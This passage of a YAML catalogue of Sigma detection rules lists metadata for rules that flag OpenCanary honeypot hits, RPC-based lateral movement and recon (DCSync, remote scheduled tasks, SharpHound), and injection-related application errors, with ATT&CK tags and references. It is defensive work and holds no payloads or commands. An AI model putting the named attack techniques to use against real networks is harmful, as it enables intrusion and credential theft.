  source_rule_path: external/sigma/rules/application/opencanary/opencanary_snmp_cmd.yml
  name: OpenCanary - SNMP OID Request
  description: Detects instances where an SNMP service on an OpenCanary node has had
    an OID request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1016
  - T1021
  tags:
  - attack.discovery
  - attack.lateral-movement
  - attack.t1016
  - attack.t1021
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ff7139bc-fdb1-4437-92f2-6afefe8884cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_ssh_login_attempt.yml
  name: OpenCanary - SSH Login Attempt
  description: Detects instances where an SSH service on an OpenCanary node has had
    a login attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021
  - T1078
  - T1133
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.lateral-movement
  - attack.persistence
  - attack.t1133
  - attack.t1021
  - attack.t1078
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: cd55f721-5623-4663-bd9b-5229cab5237d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_ssh_new_connection.yml
  name: OpenCanary - SSH New Connection Attempt
  description: Detects instances where an SSH service on an OpenCanary node has had
    a connection attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1021
  - T1078
  - T1133
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.initial-access
  - attack.lateral-movement
  - attack.persistence
  - attack.t1133
  - attack.t1021
  - attack.t1078
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 512cff7a-683a-43ad-afe0-dd398e872f36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_telnet_login_attempt.yml
  name: OpenCanary - Telnet Login Attempt
  description: Detects instances where a Telnet service on an OpenCanary node has
    had a login attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1133
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.initial-access
  - attack.command-and-control
  - attack.t1133
  - attack.t1078
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b4e6b016-a2ac-4759-ad85-8000b300d61e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_tftp_request.yml
  name: OpenCanary - TFTP Request
  description: Detects instances where a TFTP service on an OpenCanary node has had
    a request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1041
  tags:
  - attack.exfiltration
  - attack.t1041
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9db5446c-b44a-4291-8b89-fcab5609c3b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_vnc_connection_attempt.yml
  name: OpenCanary - VNC Connection Attempt
  description: Detects instances where a VNC service on an OpenCanary node has had
    a connection attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1021
  tags:
  - attack.lateral-movement
  - attack.t1021
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 19aefed0-ffd4-47dc-a7fc-f8b1425e84f9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/python/app_python_sql_exceptions.yml
  name: Python SQL Exceptions
  description: Generic rule for SQL exceptions in Python according to PEP 249
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: python
  product: python
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.python.org/dev/peps/pep-0249/#exceptions
  false_positives:
  - Application bugs
  notes: ''
- detection_id: 0fcd1c79-4eeb-4746-aba9-1b458f7a79cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_atsvc_lateral_movement.yml
  name: Remote Schedule Task Lateral Movement via ATSvc
  description: Detects remote RPC calls to create or execute a scheduled task via
    ATSvc
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.execution
  - attack.persistence
  - attack.t1053
  - attack.t1053.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: f177f2bc-5f3e-4453-b599-57eefce9a59c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_atsvc_recon.yml
  name: Remote Schedule Task Recon via AtScv
  description: Detects remote RPC calls to read information about scheduled tasks
    via AtScv
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/zeronetworks/rpcfirewall
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 56fda488-113e-4ce9-8076-afc2457922c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_dcsync_attack.yml
  name: Possible DCSync Attack
  description: Detects remote RPC calls to MS-DRSR from non DC hosts, which could
    indicate DCSync / DCShadow attacks.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.t1033
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47?redirectedfrom=MSDN
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-DRSR.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5f92fff9-82e2-48eb-8fc1-8b133556a551
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_efs_abuse.yml
  name: Remote Encrypting File System Abuse
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-EFSR
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.lateral-movement
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-EFSR.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Legitimate usage of remote file encryption
  notes: ''
- detection_id: 2053961f-44c7-4a64-b62d-f6e72800af0d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_eventlog_recon.yml
  name: Remote Event Log Recon
  description: Detects remote RPC calls to get event log information via EVEN or EVEN6
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Remote administrative tasks on Windows Events
  notes: ''
- detection_id: ace3ff54-e7fd-46bd-8ea0-74b49a0aca1d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_lateral_movement.yml
  name: Remote Schedule Task Lateral Movement via ITaskSchedulerService
  description: Detects remote RPC calls to create or execute a scheduled task
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.lateral-movement
  - attack.t1053
  - attack.t1053.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f7c49eb-2977-4ac8-8ab0-ab1bae14730e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_itaskschedulerservice_recon.yml
  name: Remote Schedule Task Recon via ITaskSchedulerService
  description: Detects remote RPC calls to read information about scheduled tasks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: bc3a4b0c-e167-48e1-aa88-b3020950e560
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_printing_lateral_movement.yml
  name: Remote Printing Abuse for Lateral Movement
  description: Detects remote RPC calls to possibly abuse remote printing service
    via MS-RPRN / MS-PAR
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.lateral-movement
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pan/e44d984c-07d3-414c-8ffc-f8c8ad8512a8
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-RPRN-PAR.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Actual printing
  notes: ''
- detection_id: 68050b10-e477-4377-a99b-3721b422d6ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_remote_dcom_or_wmi.yml
  name: Remote DCOM/WMI Lateral Movement
  description: Detects remote RPC calls that performs remote DCOM operations. These
    could be abused for lateral movement via DCOM or WMI.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.003
  - T1047
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.t1021.003
  - attack.t1047
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Some administrative tasks on remote host
  notes: ''
- detection_id: 35c55673-84ca-4e99-8d09-e334f3c29539
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_remote_registry_lateral_movement.yml
  name: Remote Registry Lateral Movement
  description: Detects remote RPC calls to modify the registry and possible execute
    code
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1112
  - attack.persistence
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-RRP.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Remote administration of registry values
  notes: ''
- detection_id: d8ffe17e-04be-4886-beb9-c1dd1944b9a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_remote_registry_recon.yml
  name: Remote Registry Recon
  description: Detects remote RPC calls to collect information
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-RRP.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Remote administration of registry values
  notes: ''
- detection_id: b6ea3cc7-542f-43ef-bbe4-980fbed444c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_remote_server_service_abuse.yml
  name: Remote Server Service Abuse
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-SRVS
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.lateral-movement
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-SRVS.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Legitimate remote share creation
  notes: ''
- detection_id: 10018e73-06ec-46ec-8107-9172f1e04ff2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_remote_service_lateral_movement.yml
  name: Remote Server Service Abuse for Lateral Movement
  description: Detects remote RPC calls to possibly abuse remote encryption service
    via MS-EFSR
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/accf23b0-0f57-441c-9185-43041f1b0ee9
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-SCMR.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Administrative tasks on remote services
  notes: ''
- detection_id: aff229ab-f8cd-447b-b215-084d11e79eb0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_sasec_lateral_movement.yml
  name: Remote Schedule Task Lateral Movement via SASec
  description: Detects remote RPC calls to create or execute a scheduled task via
    SASec
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.execution
  - attack.persistence
  - attack.t1053
  - attack.t1053.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0a3ff354-93fc-4273-8a03-1078782de5b7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_sasec_recon.yml
  name: Recon Activity via SASec
  description: Detects remote RPC calls to read information about scheduled tasks
    via SASec
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques: []
  tags:
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/d1058a28-7e02-4948-8b8d-4a347fa64931
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-TSCH.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 65f77b1e-8e79-45bf-bb67-5988a8ce45a5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_account.yml
  name: SharpHound Recon Account Discovery
  description: Detects remote RPC calls useb by SharpHound to map remote connections
    and local group membership.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1087
  tags:
  - attack.t1087
  - attack.discovery
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wkst/55118c55-2122-4ef9-8664-0c1ff9e168f3
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-WKST.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6d580420-ff3f-4e0e-b6b0-41b90c787e28
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/rpc_firewall/rpc_firewall_sharphound_recon_sessions.yml
  name: SharpHound Recon Sessions
  description: Detects remote RPC calls useb by SharpHound to map remote connections
    and local group membership.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: rpc_firewall
  product: rpc_firewall
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1033
  tags:
  - attack.discovery
  - attack.t1033
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/02b1f559-fda2-4ba3-94c2-806eb2777183
  - https://github.com/jsecurity101/MSRPC-to-ATTACK/blob/ddd4608fe8684fcf2fcf9b48c5f0b3c28097f8a3/documents/MS-SRVS.md
  - https://github.com/zeronetworks/rpcfirewall
  - https://zeronetworks.com/blog/stopping-lateral-movement-via-the-rpc-firewall/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d2c3d4c-4b48-4ac3-8f23-ea845746bb1a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/ruby/appframework_ruby_on_rails_exceptions.yml
  name: Ruby on Rails Framework Exceptions
  description: Detects suspicious Ruby on Rails exceptions that could indicate exploitation
    attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: stable
  platform: ruby_on_rails
  product: ruby_on_rails
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - http://edgeguides.rubyonrails.org/security.html
  - http://guides.rubyonrails.org/action_controller_overview.html
  - https://stackoverflow.com/questions/25892194/does-rails-come-with-a-not-authorized-exception
  - https://github.com/rails/rails/blob/cd08e6bcc4cd8948fe01e0be1ea0c7ca60373a25/actionpack/lib/action_dispatch/middleware/exception_wrapper.rb
  false_positives:
  - Application bugs
  notes: ''
- detection_id: ae48ab93-45f7-4051-9dfe-5d30a3f78e33
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/spring/spring_application_exceptions.yml
  name: Spring Framework Exceptions
  description: Detects suspicious Spring framework exceptions that could indicate
    exploitation attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: spring
  product: spring
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://docs.spring.io/spring-security/site/docs/current/api/overview-tree.html
  false_positives:
  - Application bugs
  notes: ''
- detection_id: e9edd087-89d8-48c9-b0b4-5b9bb10896b8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/spring/spring_spel_injection.yml
  name: Potential SpEL Injection In Spring Framework
  description: Detects potential SpEL Injection exploitation, which may lead to RCE.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: spring
  product: spring
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Application bugs
  notes: ''
- detection_id: 8a670c6d-7189-4b1c-8017-a417ca84a086
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/sql/app_sqlinjection_errors.yml
  name: Suspicious SQL Error Messages
  description: Detects SQL error messages that indicate probing for an injection attack
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: sql
  product: sql
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - http://www.sqlinjection.net/errors
  false_positives:
  - A syntax error in MySQL also occurs in non-dynamic (safe) queries if there is
    an empty in() clause, that may often be the case.
  notes: ''
- detection_id: 16c86189-b556-4ee8-b4c7-7e350a195a4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/velocity/velocity_ssti_injection.yml
  name: Potential Server Side Template Injection In Velocity
  description: Detects exceptions in velocity template renderer, this most likely
    happens due to dynamic rendering of user input and may lead to RCE.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: velocity
  product: velocity
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://antgarsil.github.io/posts/velocity/
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Application bugs
  - Missing .vm files
  notes: ''
- detection_id: 238527ad-3c2c-4e4f-a1f6-92fd63adb864
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/category/antivirus/av_exploiting.yml
  name: Antivirus Exploitation Framework Detection
  description: 'Detects a highly relevant Antivirus alert that reports an exploitation
    framework.

    This event must not be ignored just because the AV has blocked the malware but
    investigate, how it came there in the first place.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: stable
  platform: ''
  product: ''
  category: antivirus
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1219.002
  tags:
  - attack.execution
  - attack.t1203
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://www.nextron-systems.com/?s=antivirus
  - https://www.virustotal.com/gui/file/925b0b28472d4d79b4bf92050e38cc2b8f722691c713fc28743ac38551bc3797
